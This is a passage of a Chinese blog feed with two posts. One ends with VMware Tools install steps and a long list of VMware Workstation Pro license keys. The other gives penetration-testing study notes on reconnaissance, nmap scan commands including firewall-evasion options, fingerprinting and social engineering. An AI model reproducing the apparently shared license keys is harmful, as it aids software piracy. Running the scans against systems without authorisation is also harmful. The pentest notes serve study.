tool，在桌面上会自动出现CD标志，进入进入其中，会发现无法对VM***.tar.gz进行操作，显示只读。</p><p>解决方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.拖动VM***.tar.gz至桌面，tar zxvf VM***.tar.gz即可</span><br><span class="line">2.进入解压后的文件夹，执行</span><br><span class="line">chmod +x vmware-install.pl</span><br><span class="line">sudo .&#x2F;vmware-install.pl</span><br><span class="line">3.选择yes，一路回车，提示yes输入yes即可，最后reboot</span><br></pre></td></tr></table></figure><h2 id="软件"><a href="#软件" class="headerlink" title="软件"></a>软件</h2><h4 id="VMware激活"><a href="#VMware激活" class="headerlink" title="VMware激活"></a>VMware激活</h4><p>VMware Workstation Pro 15 激活密钥许可证</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">UY758-0RXEQ-M81WP-8ZM7Z-Y3HDA</span><br><span class="line">VF750-4MX5Q-488DQ-9WZE9-ZY2D6</span><br><span class="line">UU54R-FVD91-488PP-7NNGC-ZFAX6</span><br><span class="line">YC74H-FGF92-081VZ-R5QNG-P6RY4</span><br><span class="line">YC34H-6WWDK-085MQ-JYPNX-NZRA2</span><br><span class="line">ZC10K-8EF57-084QZ-VXYXE-ZF2XF</span><br><span class="line">UF71K-2TW5J-M88QZ-8WMNT-WKUY4</span><br><span class="line">AZ7MK-44Y1J-H819Z-WMYNC-N7ATF</span><br><span class="line">CU702-DRD1M-H89GP-JFW5E-YL8X6</span><br><span class="line">YY5EA-00XDJ-480RP-35QQV-XY8F6</span><br><span class="line">VA510-23F57-M85PY-7FN7C-MCRG0</span><br><span class="line">VC1J8-0TX11-M84WP-2WNGX-PQKD8</span><br><span class="line">AA7EU-FUE97-4896Q-3WYZC-WYKY0</span><br><span class="line">ZY7EU-2JG01-H8EDZ-9NYNX-ZVHW0</span><br><span class="line">AZ312-2FE41-M81LP-R6WEZ-NA2Z4</span><br><span class="line">AU71H-0VE44-M81DZ-77Y5C-QG0G4</span><br><span class="line">ZA7HK-AWFE2-M80AY-KDNZG-XQ2X8</span><br><span class="line">CA58K-DDF13-H88PY-VWN7V-XKHW2</span><br><span class="line">GV10H-A4E02-H84VY-JXYEV-NAATD</span><br><span class="line">VA71K-83Y55-H88NP-JWZEG-YYK92</span><br><span class="line">FY3JH-6XGEN-088HZ-95WET-QCKVD</span><br><span class="line">VG5HH-D6E04-0889Y-QXZET-QGUC8</span><br><span class="line">CY55A-F6G80-H85HQ-WNN5X-W38W4</span><br><span class="line">AC11H-4HZ05-08EDQ-APQGX-YCUC8</span><br><span class="line">ZG780-8EZ9M-M89LY-M5PEG-W2AZ8</span><br><span class="line">ZF3NU-D6XEJ-48E7Q-27YNC-PC8ED</span><br><span class="line">AV5M0-F4W8M-088PZ-36ZNV-NFHE2</span><br><span class="line">AU15R-A0Z4N-M88HY-HQYNX-QYKD6</span><br><span class="line">VY110-4RD50-H886P-5FMN9-WPUUD</span><br><span class="line">GF302-4HW44-H88DQ-WZXNV-Q3R94</span><br><span class="line">UA752-0KF9J-0811Y-MQNEX-ZUAGF</span><br></pre></td></tr></table></figure><p>VMware Workstation Pro 14 激活密钥许可证</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">AC5XK-0ZD4H-088HP-9NQZV-ZG2R4</span><br><span class="line">FF590-2DX83-M81LZ-XDM7E-MKUT4</span><br><span class="line">CG54H-D8D0H-H8DHY-C6X7X-N2KG6</span><br><span class="line">ZC3WK-AFXEK-488JP-A7MQX-XL8YF</span><br><span class="line">AA702-81D8N-0817Y-75PQT-Q70A4</span><br><span class="line">YC592-8VF55-M81AZ-FWW5T-WVRV0</span><br><span class="line">FC78K-FKED6-H88LZ-0QPEE-QP8X6</span><br><span class="line">UV1H2-AKWD2-H8EJZ-GGMEE-PCATD</span><br><span class="line">AC310-0VG0P-M88CQ-YWY5Z-QPRG0</span><br><span class="line">FF31K-AHZD1-H8ETZ-8WWEZ-WUUVA</span><br><span class="line">CV7T2-6WY5Q-48EWP-ZXY7X-QGUWD</span><br></pre></td></tr></table></figure><p>VMware Workstation Pro 12 激活密钥许可证</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">5A02H-AU243-TZJ49-GTC7K-3C61N</span><br><span class="line">VF5XA-FNDDJ-085GZ-4NXZ9-N20E6</span><br><span class="line">UC5MR-8NE16-H81WY-R7QGV-QG2D8</span><br><span class="line">ZG1WH-ATY96-H80QP-X7PEX-Y30V4</span><br><span class="line">AA3E0-0VDE1-0893Z-KGZ59-QGAVF</span><br><span class="line">VU1XA-DGE5L-080NZ-LQNNG-MY2R8</span><br><span class="line">YZ5N2-F4E96-485HY-4WPXV-XQ2Z8</span><br><span class="line">YZ54H-A3G5N-4815Y-J6P79-QG0G8</span><br><span class="line">YZ3R0-6EDE0-M89HZ-4YZEC-NUAU8</span><br></pre></td></tr></table></figure><p>VMware Workstation Pro 11 激活密钥许可证</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1F04Z-6D111-7Z029-AV0Q4-3AEH8</span><br></pre></td></tr></table></figure><p>VMware Workstation Pro 10 激活密钥许可证</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1Z0G9-67285-FZG78-ZL3Q2-234JG</span><br><span class="line">4C4EK-89KDL-5ZFP9-1LA5P-2A0J0</span><br><span class="line">HY086-4T01N-CZ3U0-CV0QM-13DNU</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="问题解决" scheme="http://yoursite.com/categories/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/"/>
    
    
      <category term="日常踩坑" scheme="http://yoursite.com/tags/%E6%97%A5%E5%B8%B8%E8%B8%A9%E5%9D%91/"/>
    
  </entry>
  
  <entry>
    <title>PTE理论1</title>
    <link href="http://yoursite.com/2020/07/16/PTE%E7%90%86%E8%AE%BA1/"/>
    <id>http://yoursite.com/2020/07/16/PTE理论1/</id>
    <published>2020-07-16T00:55:34.000Z</published>
    <updated>2020-07-27T03:12:42.220Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="PTE理论1"><a href="#PTE理论1" class="headerlink" title="PTE理论1"></a>PTE理论1</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h4 id="信息收集概述"><a href="#信息收集概述" class="headerlink" title="信息收集概述"></a>信息收集概述</h4><p>黑客在攻击前、过程中对目标所进行的探测活动。</p><p>信息收集的作用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">缩小攻击范围</span><br><span class="line">了解架构安全</span><br><span class="line">建立信息数据库</span><br><span class="line">描绘网络拓扑</span><br></pre></td></tr></table></figure><p>信息收集分类</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">主动信息收集</span><br><span class="line">被动信息收集</span><br></pre></td></tr></table></figure><p>信息收集内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">网络信息：域名、控制策略、开放端口、协议、防火墙、认证机制、VPN接入点、IP地址、网段</span><br><span class="line">系统信息：系统banner、目录、临时文件、路由表、系统架构</span><br><span class="line">组织信息：组织背景、员工信息、邮箱&#x2F;电话、地址、官网</span><br></pre></td></tr></table></figure><p>主动信息收集</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">netbios枚举</span><br><span class="line">SNMP枚举</span><br><span class="line">Linux枚举</span><br><span class="line">LDAP枚举</span><br><span class="line">ntp枚举</span><br><span class="line">smtp枚举</span><br><span class="line">DNS枚举</span><br></pre></td></tr></table></figure><h4 id="whois信息"><a href="#whois信息" class="headerlink" title="whois信息"></a>whois信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">域名信息</span><br><span class="line">所有者联系方式</span><br><span class="line">域名服务器</span><br><span class="line">网站IP范围</span><br><span class="line">域名创建时间</span><br><span class="line">过期记录</span><br><span class="line">最近更新记录</span><br></pre></td></tr></table></figure><p>DNS资源记录类型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">A记录</span><br><span class="line">CNAME</span><br><span class="line">NS</span><br><span class="line">PTR</span><br><span class="line">MX</span><br></pre></td></tr></table></figure><p>DNS查询</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kali自带nslookup</span><br><span class="line">dig</span><br></pre></td></tr></table></figure><p>确定地址范围作用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">协助绘制目标网络拓扑图</span><br><span class="line">使用ARIN whois database search 工具找到IP地址范围</span><br><span class="line">通过区域因特网注册机构找到IP地址范围和目标子网掩码</span><br></pre></td></tr></table></figure><h4 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h4><p>用途</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">端口探测</span><br><span class="line">主机探测</span><br><span class="line">系统探测</span><br><span class="line">版本探测</span><br></pre></td></tr></table></figure><p>常用参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">-v 详细</span><br><span class="line">-p 指定端口范围</span><br><span class="line">-O 操作系统识别</span><br><span class="line">-A 全面检测</span><br><span class="line">-sV 探测端口-服务器版本</span><br><span class="line">-sA ACK扫描-探测防火墙</span><br><span class="line">-sP ping扫描-快速扫描</span><br><span class="line">-sS TCP SYN半开放扫描-隐蔽扫描</span><br><span class="line">-sT 全连接扫描-防火墙会留日志</span><br><span class="line">-sU UDP扫描-确定端口开放</span><br></pre></td></tr></table></figure><p>常用扫描参数示例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">半开放扫描全端口：nmap -sS -p 1-65535 -v ip&#x2F;url</span><br><span class="line"></span><br><span class="line">扫描C段存活主机：nmap -sP ip&#x2F;url</span><br><span class="line"></span><br><span class="line">指定端口扫描：nmap -p 80 ip&#x2F;url</span><br><span class="line"></span><br><span class="line">扫描主机操作系统：nmap -O ip&#x2F;url</span><br><span class="line"></span><br><span class="line">主机详细扫描：nmap -A -v IP&#x2F;url</span><br><span class="line"></span><br><span class="line">穿透防火墙扫描：</span><br><span class="line">nmap -Pn -A ip&#x2F;url</span><br><span class="line">nmap -sS -T4 ip&#x2F;url</span><br><span class="line">nmap -sF -T4 ip&#x2F;url</span><br><span class="line">nmap -sA -T4 ip&#x2F;url</span><br></pre></td></tr></table></figure><h4 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h4><p>大部分应用组件存在说明当前服务名称和版本的特征，识别这些特征即可获取当前服务信息。</p><p>web架构</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">大多数web组件可以粗略的分为三个组件：</span><br><span class="line">客户端</span><br><span class="line">服务端</span><br><span class="line">后端存储，一般是DBMS，用于查询和存储数据</span><br></pre></td></tr></table></figure><p>客户端技术</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">客户端技术包括html、falsh、javascript。。。</span><br></pre></td></tr></table></figure><p>服务端技术</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">web服务器：Apache、Nginx、IIS、linghttpd。。。</span><br><span class="line">应用服务器：tomcat、jboss、Oracle。。。。</span><br><span class="line">编程语言：PHP、java、ruby、Python、C#</span><br></pre></td></tr></table></figure><p>后端存储技术</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">中小型网站，一般数据库和web服务器在同一台服务器上。</span><br><span class="line">关系型数据库：Mysql、Oracle、DB2、SQL Server、Postgresql、Sqlite。。。</span><br><span class="line">NOSQL：MongoDB、CouchDB、Redis。。。</span><br><span class="line"></span><br><span class="line">目录访问：openLDAP、Active Directory</span><br></pre></td></tr></table></figure><p>常见的web应用指纹识别</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">特殊文件的MD5值匹配</span><br><span class="line">请求响应主体内容或头信息的关键字匹配</span><br><span class="line">请求响应主体内容或头信息的正则匹配</span><br><span class="line">基于url关键字识别</span><br><span class="line">基于TCP&#x2F;IP请求协议识别服务指纹</span><br></pre></td></tr></table></figure><p>手工检测恶意指纹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTTP分析：</span><br><span class="line">1.观察响应头的server、X-forward-by、cookie字段</span><br><span class="line">2.使用畸形的host字段的HTTP请求试探，观察响应头</span><br><span class="line"></span><br><span class="line">网站的HTML源码</span><br></pre></td></tr></table></figure><p>根据网站页面后缀判断</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">存在.php结尾的文件说明该web应用是用PHP写的；</span><br><span class="line">存在.jsp或.do的文件，说明该web应用是用java写的；</span><br><span class="line">存在.asp或.aspx结尾的文件，说明该web应用可能是由vb或C#写的</span><br></pre></td></tr></table></figure><p>浏览网站favicon.ico</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可以通过默认favicon.ico来判断CMS</span><br></pre></td></tr></table></figure><p>robots.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">有些cms会有默认的robots.txt，可以通过robots.txt来判断CMS</span><br></pre></td></tr></table></figure><p>刻意构造错误</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">错误页面可以提供关于服务器的大量信息，可以构造错误来尝试得到404界面。</span><br></pre></td></tr></table></figure><p><img src="/2020/07/16/PTE%E7%90%86%E8%AE%BA1/image-20200716103839018.png" alt="image-20200716103839018"></p><p>自动化指纹分析工具</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">whatweb</span><br><span class="line">wappalyzer</span><br><span class="line">天蝎指纹库</span><br><span class="line">plecost</span><br><span class="line">website analyzer</span><br><span class="line">cms-explorer</span><br><span class="line">shodan&#x2F;fofa&#x2F;zoomeye&#x2F;傻蛋</span><br></pre></td></tr></table></figure><h4 id="社会工程学"><a href="#社会工程学" class="headerlink" title="社会工程学"></a>社会工程学</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">窃听</span><br><span class="line">肩窥</span><br><span class="line">垃圾搜寻</span><br><span class="line">社交模仿</span><br></pre></td></tr></table></figure><p>社交网络SNS</p><p><img src="/2020/07/16/PTE%E7%90%86%E8%AE%BA1/image-20200716111209068.png" alt="image-20200716111209068"></p><h2 id="渗透测试流程"><a href="#渗透测试流程" class="headerlink" title="渗透测试流程"></a>渗透测试流程</h2><h4 id="渗透测试分类"><a href="#渗透测试分类" class="headerlink" title="渗透测试分类"></a>渗透测试分类</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">黑盒测试</span><br><span class="line">白盒测试</span><br><span class="line">灰盒测试</span><br></pre></td></tr></table></figure><h4 id="渗透测试过程"><a href="#渗透测试过程" class="headerlink" title="渗透测试过程"></a>渗透测试过程</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">前期交互阶段</span><br><span class="line">情报收集阶段</span><br><span class="line">威胁建模阶段</span><br><span class="line">漏洞分析阶段</span><br><span class="line">渗透攻击阶段</span><br><span class="line">后渗透攻击阶段</span><br><span class="line">完成报告</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="PTE" scheme="http://yoursite.com/categories/PTE/"/>
    
    
      <category term="PTE" scheme="http://yoursite.com/tags/PTE/"/>
    
  </entry>
  
</feed>
